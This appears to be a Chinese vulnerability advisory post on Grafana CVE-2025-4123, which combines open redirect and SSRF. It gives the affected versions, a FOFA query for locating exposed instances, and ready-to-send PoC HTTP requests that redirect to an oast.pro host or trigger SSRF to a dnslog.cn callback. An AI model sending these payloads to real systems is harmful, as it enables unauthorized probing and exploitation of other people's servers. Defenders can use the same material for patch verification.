#  Grafana开放重定向&服务端请求伪造漏洞(CVE-2025-4123)   
 HK安全小屋   2025-06-01 09:12  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
漏洞描述：  
  
Grafana是Grafana开源的一套提供可视化监控界面的开源监控工具。该工具主要用于监控和分析Graphite、InfluxDB和Prometheus等。Grafana存在安全漏洞，该漏洞源于客户端路径遍历和开放重定向结合，可能导致跨站脚本攻击。  
  
  
影响版本：  
```
8.0.0 ≤ grafana <10.4.18 
11.2.0 ≤ grafana <11.2.9 
11.3.0 ≤ grafana <11.3.6 
11.4.0 ≤ grafana <11.4.4 
11.5.0 ≤ grafana <11.5.4 
11.6.0 ≤ grafana <11.6.1 
12.0.0 ≤ grafana <12.0.1 
```  
  
  
FOFA:  
```
app="Grafana"
```  
  
  
POC：  
  
测试是否开放重定向  
```
GET /public/..%2F%5coast.pro%2F%3f%2F..%2F.. HTTP/1.1
Host: 127.0.0.1:8080
```  
  
如果返回内容如下则开放重定向：  
```
HTTP/1.1 302 Found
Content-Type: text/html; charset=utf-8
Location: /\oast.pro/?/../../
Date: Sun,1 Jun 2025 15:36:13 GMT
Content-length: 42

<a href="/\oast.pro/?/../../">Found</a>.
```  
  
服务端请求伪造：  
```
GET /render/public/..%252f%255C75desw.dnslog.cn%252f%253F%252f..%252f.. HTTP/1.1
Host: 127.0.0.1:8080
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI1NZB5q3WibHJtYt0zLMdxRaZsJNoicbH6cdTpyibtAweickdNnVFQiaoSqMfJcYfgYcQwucNRdFNhiadxw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
